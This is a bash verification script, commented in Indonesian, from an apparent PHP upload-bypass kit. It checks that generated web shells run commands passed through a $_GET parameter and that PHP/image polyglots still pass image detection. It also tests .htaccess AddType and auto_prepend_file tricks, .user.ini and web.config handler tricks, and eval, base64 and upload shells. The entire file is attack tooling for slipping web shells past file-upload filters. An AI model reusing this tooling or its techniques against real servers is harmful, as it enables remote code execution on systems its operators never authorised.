#!/usr/bin/env bash
# verify_cmd.sh — verifikasi tiap artefak di dir ini.
#   1) payload utuh ada di file
#   2) PHP benar-benar mengeksekusi file itu (include, $_GET[x] = echo penanda)
#   3) file polyglot harus lolos deteksi gambar (getimagesize, atau file(1) utk svg/pdf)
#   4) file shell/config diuji fungsional
set -uo pipefail
cd "$(dirname "$0")"

SRC='build_cmd.sh build_shells.sh build_all.sh clean_cmd.sh verify_cmd.sh selfcheck.py imgmagic.py payloads.txt ext_core.txt ext_poly.txt ext_double.txt ext_trailing.txt README.md .canary_saya'
PAYLOAD=$(head -n1 payloads.txt)

total=0; ok_exec=0; poly_ok=0; poly_bad=0
shell_ok=0; shell_bad=0
bad_exec=(); bad_img=(); bad_shell=()

keys_for() { sed -e 's/#.*//' -e 's/[[:space:]]\+/ /g' -e 's/^ //' -e 's/ $//' "$1" | grep -v '^$'; }

# nama file polyglot yang diharapkan + magic yang dipakai
declare -A WANT
while IFS= read -r line; do
  ext=$(echo "$line" | cut -d' ' -f1); mg=$(echo "$line" | cut -d' ' -f2- | tr 'A-Z' 'a-z')
  WANT["x${ext}"]="$mg"
done < <(keys_for ext_poly.txt)

while IFS= read -r -d '' path; do
  f=${path#./}
  case " $SRC " in *" $f "*) continue ;; esac

  # --- shell & config: uji fungsional ---
  case "$f" in
    shell-param.php|shell-eval.php|shell-b64.php)
      # diuji sekaligus oleh selfcheck.py di akhir; di sini hanya hitung
      continue ;;
    htaccess-*|.user.ini.php|web-config.php|shell-upload.php)
      need=""
      case "$f" in
        htaccess-self.php)     need='AddType application/x-httpd-php .htaccess' ;;
        htaccess-addtype.php)  need='AddType application/x-httpd-php' ;;
        htaccess-phpvalue.php) need='auto_prepend_file' ;;
        .user.ini.php)         need='auto_prepend_file' ;;
        web-config.php)        need='handlers' ;;
        shell-upload.php)      need='move_uploaded_file' ;;
      esac
      if ! grep -q "$need" "$f"; then shell_bad=$((shell_bad+1)); bad_shell+=("$f(isi)"); continue; fi
      case "$f" in
        htaccess-self.php|shell-upload.php)
          if ! php -l "$f" >/dev/null 2>&1; then shell_bad=$((shell_bad+1)); bad_shell+=("$f(sintaks)"); continue; fi ;;
      esac
      shell_ok=$((shell_ok+1))
      continue ;;
  esac

  total=$((total+1))

  # (1) payload ada?
  if ! grep -qF -- "$PAYLOAD" "$f"; then echo "PAYLOAD-HILANG: $f"; bad_exec+=("$f"); continue; fi

  # (2) PHP mengeksekusi file?
  out=$(php -r '$_GET["x"]="echo ROSE_TEST_'"$total"'"; @include $argv[1];' "$f" 2>/dev/null | tr -d '\0')
  [[ "$out" == *"ROSE_TEST_$total"* ]] && ok_exec=$((ok_exec+1)) || bad_exec+=("$f")

  # (3) polyglot harus lolos deteksi gambar
  mg=${WANT[$f]:-}
  if [ -n "$mg" ]; then
    case "$mg" in
      svg) file -b "$f" | grep -qi 'SVG' && poly_ok=$((poly_ok+1)) || { poly_bad=$((poly_bad+1)); bad_img+=("$f(svg)"); } ;;
      pdf) file -b "$f" | grep -qi 'PDF document' && poly_ok=$((poly_ok+1)) || { poly_bad=$((poly_bad+1)); bad_img+=("$f(pdf)"); } ;;
      *)   php -r '$i=@getimagesize($argv[1]); exit($i?0:1);' "$f" && poly_ok=$((poly_ok+1)) || { poly_bad=$((poly_bad+1)); bad_img+=("$f($mg)"); } ;;
    esac
  fi
done < <(find . -maxdepth 1 -type f -print0)

# verifikasi fungsional shell (lewat Python: hindari masalah quoting bash -> PHP)
echo "--- selfcheck shell ---"
if python3 selfcheck.py >/tmp/selfcheck.out 2>&1; then
  shell_ok=$((shell_ok+3))
  cat /tmp/selfcheck.out
else
  shell_bad=$((shell_bad+1)); bad_shell+=("shell-param/eval/b64")
  cat /tmp/selfcheck.out
fi

echo "artefak          : $total"
echo "eksekusi PHP OK  : $ok_exec"
echo "eksekusi GAGAL   : ${#bad_exec[@]}"
echo "polyglot OK      : $poly_ok"
echo "polyglot GAGAL   : $poly_bad"
echo "shell OK         : $shell_ok"
echo "shell GAGAL      : $shell_bad"
[ ${#bad_exec[@]}  -gt 0 ] && printf '  exec-gagal: %s\n' "${bad_exec[@]}"
[ ${#bad_img[@]}   -gt 0 ] && printf '  img-gagal : %s\n' "${bad_img[@]}"
[ ${#bad_shell[@]} -gt 0 ] && printf '  shell-gagal: %s\n' "${bad_shell[@]}"
if [ ${#bad_exec[@]} -eq 0 ] && [ $poly_bad -eq 0 ] && [ $shell_bad -eq 0 ]; then echo "HASIL: PASS"; else echo "HASIL: FAIL"; exit 1; fi
